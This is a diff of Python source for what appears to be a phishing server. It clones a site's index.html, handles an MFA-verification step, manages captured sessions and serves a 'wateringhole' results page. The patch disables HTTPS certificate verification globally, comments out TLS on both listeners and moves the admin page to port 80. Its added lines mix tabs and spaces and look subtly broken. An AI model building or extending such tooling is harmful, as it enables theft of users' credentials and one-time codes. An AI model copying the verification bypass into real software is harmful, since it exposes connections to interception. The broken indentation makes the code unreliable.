@@ -107,7 +107,11 @@ def quiet_print(string, log = False):
 		print(string)
 
 def download_site():
-	quiet_print("Downloading index.html...", True)
+        if (not os.environ.get('PYTHONHTTPSVERIFY', '') and getattr(ssl, '_create_unverified_context', None)):
+            ssl._create_default_https_context = ssl._create_unverified_context
+
+        message = "Downloading index.html from " + args[0]
+	quiet_print(message, True)
 	response = urllib2.urlopen(args[0])
 	webContent = response.read()
 	if not os.path.exists(os.path.dirname("webroot/index.html")):
@@ -571,11 +575,11 @@ def handle_mfa_verify(slug, data):
 
 def sessions_management():
 	while True:
-		die_lock.acquire()
-		if die:
-			die_lock.release()
-			sys.exit(0)
-		die_lock.release()
+	    die_lock.acquire()
+	    if die:
+	        die_lock.release()
+	        sys.exit(0)
+	    die_lock.release()
 
 	    lock.acquire()
 	    for rid in users:
@@ -592,7 +596,7 @@ def sessions_management():
 def result_server(handler_class=Results, port=4158):
 	server_address = ('', port)
 	httpd = ThreadedHTTPServer(server_address, handler_class)
-	httpd.socket = ssl.wrap_socket (httpd.socket, certfile=args[2], keyfile=args[3], server_side=True, ssl_version=ssl.PROTOCOL_TLSv1_2)
+	#httpd.socket = ssl.wrap_socket (httpd.socket, certfile=args[2], keyfile=args[3], server_side=True, ssl_version=ssl.PROTOCOL_TLSv1_2)
 	global die_lock, die
 	while True:
 		die_lock.acquire()
@@ -605,16 +609,18 @@ def result_server(handler_class=Results, port=4158):
 	
 
 
-        
-def start_server(handler_class=S, port=4298):
-	server_address = ('', port)
+def start_server(handler_class=S, port=80):
+	server_address = ('localhost', port)
 	httpd = ThreadedHTTPServer(server_address, handler_class)
-	httpd.socket = ssl.wrap_socket (httpd.socket, certfile=args[2], keyfile=args[3], server_side=True, ssl_version=ssl.PROTOCOL_TLSv1_2)
+	#httpd.socket = ssl.wrap_socket (httpd.socket, certfile=args[2], keyfile=args[3], server_side=True, ssl_version=ssl.PROTOCOL_TLSv1_2)
 	res = Thread(target = result_server, args = [])
+        message = "Starting results page at http://127.0.0.1:4158/wateringhole"
+	quiet_print(message, True)
 	res.start()
 	ses = Thread(target = sessions_management, args = [])
 	ses.start()
-
+        message = "Starting admin page at http://127.0.0.1:" + str(port)
+	quiet_print(message, True)
 	httpd.serve_forever()
 
 
